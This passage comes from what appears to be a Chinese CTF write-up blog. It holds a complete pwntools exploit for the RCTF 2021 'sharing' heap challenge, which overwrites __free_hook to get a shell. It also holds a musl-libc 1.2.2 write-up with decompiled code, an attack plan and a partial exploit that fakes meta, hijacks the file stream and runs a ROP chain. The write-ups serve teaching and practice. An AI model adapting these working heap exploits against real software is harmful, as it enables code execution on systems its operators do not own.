class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :tcache + 数组越界</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br><br>p = process(<span class="hljs-string">&#x27;./sharing&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(idx,size):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(idx))<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(size))<br><br>def move(<span class="hljs-keyword">From</span>,<span class="hljs-keyword">To</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(<span class="hljs-keyword">From</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(<span class="hljs-keyword">To</span>))<br><br>def show(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>,str(idx))<br><br>def <span class="hljs-built_in">edit</span>(idx,content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>,content)<br><br>log.success(<span class="hljs-string">&quot;******************leak libcbase *************************&quot;</span>)<br><span class="hljs-comment"># 单链表tcache_entry，也即tcache Bin的默认最大数量是64，</span><br><span class="hljs-comment"># 在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</span><br><span class="hljs-built_in">add</span>(0,0x410)<br><span class="hljs-built_in">add</span>(1,0x410)<br>move(1,0) #<span class="hljs-attribute">idx</span>=0已经分别放到tcache和unsorted bin，由于heap manager中的地址已经被修改了，所以不存在UAF<br><span class="hljs-built_in">add</span>(2,0x410) # 再次申请，将其从unsorted bin中取出，利用脏数据泄露地址<br>show(2)<br><br>libcbase = u64(p.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x3ebca0<br>__free_hook = libcbase + libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libcbase + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;libcbase: &quot;</span> + hex(libcbase))<br><br>log.success(<span class="hljs-string">&quot;******************leak heapbase *************************&quot;</span>)<br><span class="hljs-built_in">add</span>(3,0x100)<br><span class="hljs-built_in">add</span>(4,0x100)<br><span class="hljs-built_in">add</span>(5,0x100)<br><span class="hljs-built_in">add</span>(6,0x100)<br>move(4,3) # free 3<br>move(6,5) # free 5<br><span class="hljs-built_in">add</span>(7,0x100) # malloc 5<br>show(7) # 地址已被修改，不存在UAF，所以只能重新申请来泄露<br>heap = u64(p.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;heap: &quot;</span> + hex(heap))<br><br>fake_heap_manager_chunk = p64(heap - 0x450 + 0x20) + p64(heap - 0x450 + 0x10) # <span class="hljs-attribute">idx</span>=1<br>fake_0x30_chunk = p64(heap - 0xe86260) + p64(0x0000000100000002) + p64(0x100) + p64(__free_hook)<br><br>fake_ptr = fake_heap_manager_chunk + fake_0x30_chunk<br><span class="hljs-built_in">edit</span>(1,fake_ptr) # idx = 443 = 0x1bb = (heap - 0x450 -heap_manager)/0x10 利用下标越界<br><span class="hljs-built_in">edit</span>(443,p64(system)) # 修改__free_hook为system<br><br><span class="hljs-built_in">add</span>(8,0x100)<br><span class="hljs-built_in">add</span>(9,0x100)<br><span class="hljs-built_in">edit</span>(8,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>move(9,8)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x4-Reference"><a href="#0x4-Reference" class="headerlink" title="0x4 Reference"></a>0x4 Reference</h2><ul><li><a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">https://blog.rois.io/2021/rctf-2021-official-writeup-2/</a></li><li><a href="https://ctf.njupt.edu.cn/700.html#sharing">https://ctf.njupt.edu.cn/700.html#sharing</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>tcache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021RCTF-musl</title>
    <link href="/2021/10/02/2021RCTF-musl/"/>
    <url>/2021/10/02/2021RCTF-musl/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>利用<code>2021RCTF</code>的<code>musl</code>学习一下<code>musl-libc</code>的利用技巧。在阅读之前建议根据文末的参考资料了解一下<code>musl-libc</code>的基本知识。<br>题目musl采用的是<code>musl-libc 1.2.2</code></p><h2 id="0x1-功能分析"><a href="#0x1-功能分析" class="headerlink" title="0x1 功能分析"></a>0x1 功能分析</h2><ul><li><p>add（漏洞点）: 先申请一个size&#x3D;0xc的控制堆块chunk1，将chunk1放到全局指针数组ptr中，然后再根据用户输入的大小申请内容堆块chunk2，并将chunk2的地址存放在chunk1的前8字节，chunk2的大小减一存放在chunk1的剩余4字节。之后再根据chunk1的地址和大小进行输入内容。</p><figure class="highlight arduino"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  v3 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xC</span>uLL);<br>  <span class="hljs-keyword">if</span> ( !v3 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  ptr[idx] = v3;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size?&quot;</span>);<br>  size = <span class="hljs-built_in">readint</span>();<br>  *(_QWORD *)v3 = <span class="hljs-built_in">malloc</span>(size);<br>  v3[<span class="hljs-number">2</span>] = size - <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Contnet?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">readn</span>(*(_QWORD *)v3, v3[<span class="hljs-number">2</span>]);           <span class="hljs-comment">// overflow 整数溢出 0-1=-1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>show：根据idx在ptr中确定chunk1的地址，然后从chunk1中取出chunk2的地址和内容大小，然后利用地址输出内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt;= <span class="hljs-number">15</span> &amp;&amp; (v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)ptr[idx]) != <span class="hljs-number">0LL</span> &amp;&amp; <span class="hljs-built_in">strlen</span>(*v2) &lt;= *((<span class="hljs-type">int</span> *)v2 + <span class="hljs-number">2</span>) )<span class="hljs-comment">// 0&lt;=idx&lt;=15,内容长度小于等于size，对应堆数组值不为0</span><br>    result = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: %s\n&quot;</span>, *v2);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>delete：根据idx在ptr中确定chunk1的地址，然后从chunk1中取出chunk2的地址,然后依次释放chunk2和chunk1，并都置为0。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> **ptr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  ptr = (<span class="hljs-type">void</span> **)::ptr[idx];<br>  <span class="hljs-keyword">if</span> ( !*ptr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-built_in">free</span>(*ptr);<br>  <span class="hljs-built_in">free</span>(ptr);<br>  ::ptr[idx] = <span class="hljs-number">0LL</span>;<br>  *ptr = <span class="hljs-number">0LL</span>;<br>  *((_DWORD *)ptr + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol><li>由于申请一个group的chunk时优先选取新的可用chunk，而不是刚free的chunk，所以我没需要先把该group中的所有chunk申请了;</li><li>为了泄露地址，我们需要连续申请多个自定义size&#x3D;0xc的chunk，这样就可以删除其中一个chunk,然后再申请它，此时进行溢出，填充非<code>\x00</code>字节直到下一个chunk的控制堆块，从而可以使用<code>show</code>泄露出下一个chunk的内容堆块的地址；</li><li>利用上述方法泄露出<code>heap_addr</code>和<code>__malloc_context</code>，前者可以用来确定libc基址，后者可以用于伪造meta，从而触发<code>dequeue函数</code>（类似glibc的<code>unlink</code>），将指针<code>ofl_head</code>(类似glibc的<code>__IO_list_all</code>)的值改为伪造的文件流</li><li>在伪造的文件流中设置<code>magic_gadget</code>,进行栈迁移到ROP链的地址处，进行ORW;</li><li>执行<code>exit</code>从而执行<code>__stdio_exit</code>函数和<code>close_file(FILE *f)</code>，从而执行<code>magic_gadget</code>和ORW，获取flag。</li></ol><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :dequeue（musl-libc 1.2.2） + 堆溢出 + 整数溢出 + FSOP</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string"></span><br><span class="hljs-string">seccomp-tools dump ./musl </span><br><span class="hljs-string"> line  CODE  JT   JF      K</span><br><span class="hljs-string">=================================</span><br><span class="hljs-string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="hljs-string"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="hljs-string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="hljs-string"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="hljs-string"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="hljs-string"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="hljs-string"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process([<span class="hljs-string">&#x27;./libc.so&#x27;</span>,<span class="hljs-string">&#x27;./musl&#x27;</span>])<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendlineafter(<span class="hljs-string">&quot;size?&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&quot;Contnet?&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment"># 因为申请该group的chunk时优先选取新的可用chunk，而不是free的chunk</span><br><span class="hljs-comment"># 该group可以有30个，必须要先全部申请了</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    add(i,<span class="hljs-number">0xC</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0xB</span>) <span class="hljs-comment"># 一次就是2个</span><br><br>log.info(<span class="hljs-string">&quot;leak libc &amp; leak heap&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0xf</span>) <span class="hljs-comment"># 使用的就是free的chunk &#x27;\n&#x27;占1Byte，所以只需输入0xf</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;BB\n&quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address =  heap_addr - <span class="hljs-number">0x298d50</span><br>__malloc_context = libc.sym[<span class="hljs-string">&quot;__malloc_context&quot;</span>]<br>log.success(<span class="hljs-string">&quot;heap_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))<br>log.success(<span class="hljs-string">&quot;__malloc_context: &quot;</span> + <span class="hljs-built_in">hex</span>(__malloc_context))<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br><br>log.info(<span class="hljs-string">&quot;leak check&quot;</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x10</span> + p64(__malloc_context)) <span class="hljs-comment"># 修改idx=3的 控制chunk 中的 内容chunk 指针为 __malloc_context,即可控制ctx</span><br>show(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>check = u64(p.recv(<span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&quot;check: &quot;</span> + <span class="hljs-built_in">hex</span>(check))<br><br><span class="hljs-comment"># gadgets</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">magic_gadget:</span><br><span class="hljs-string">0x7ffff7db05ae &lt;longjmp+30&gt;:mov    rsp,QWORD PTR [rdi+0x30]</span><br><span class="hljs-string">0x7ffff7db05b2 &lt;longjmp+34&gt;:jmp    QWORD PTR [rdi+0x38]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>magic_gadget = libc.address + <span class="hljs-number">0x4a5ae</span><br>ret = libc.address + <span class="hljs-number">0x598</span><br>pop_rax_ret = libc.address + <span class="hljs-number">0x1b8fd</span><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x14b82</span><br>pop_rdx_ret = libc.address + <span class="hljs-number">0x9328</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x1b27a</span><br>syscall = libc.address + <span class="hljs-number">0x1d14</span><br>syscall_ret = libc.address + <span class="hljs-number">0x23711</span><br><br>sc = <span class="hljs-number">0</span><br>freeable = <span class="hljs-number">1</span><br>last_idx = <span class="hljs-number">0</span><br>maplen = <span class="hljs-number">0</span><br>ofl_head_addr = libc.address + <span class="hljs-number">0x297E68</span> <br>fake_mem_addr = heap_addr + <span class="hljs-number">0xF0</span> - <span class="hljs-number">0x50</span><br><br>log.info(<span class="hljs-string">&quot;write ORW &amp; fake meta &amp; fake meta_area to Mem&quot;</span>)<br>orw = <span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x300</span><br><span class="hljs-comment"># fd = open(flag_addr,0) = 3</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x60</span>) <span class="hljs-comment"># &quot;./flag&quot;的地址 因为是后面才写入该字符串，所以后面才能确定</span><br>orw += p64(pop_rsi_ret)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br><span class="hljs-comment"># read(fd,buf,0x1000)</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x100</span>) <span class="hljs-comment"># heap_addr + 0x1b0 &lt; the address &lt;heap_addr + 0x12b0 就不能输出??</span><br>orw += p64(pop_rdx_ret)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&quot;read&quot;</span>])<br><span class="hljs-comment"># write(1,buf,0x1000)</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x100</span>)<br>orw += p64(pop_rdx_ret)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&quot;write&quot;</span>])<br><br>payload1 = orw<br>payload1 = payload1.ljust(<span class="hljs-number">0x1000</span>-<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;E&#x27;</span>) <span class="hljs-comment">#加上开始的0x20字节元数据(meta_area)，刚好占了1页（0x1000）</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">下面是新的一页，所以需要meta_area,check必须一致，因为get_meta函数中会检查，check位于meta所在页的前8字节</span><br><span class="hljs-string">根据mata找meta_area: meta &amp; 0xfffffffffffff000 ,即找当前页的起始地址</span><br><span class="hljs-string">由于只检查了check，所以只需要构造check,然后\x00截断一下即可</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># fake meta_area</span><br>payload1 += p64(check) <span class="hljs-comment"># 存放地址是mmaped_page + 0x1000</span><br>payload1 += p64(<span class="hljs-number">0</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span 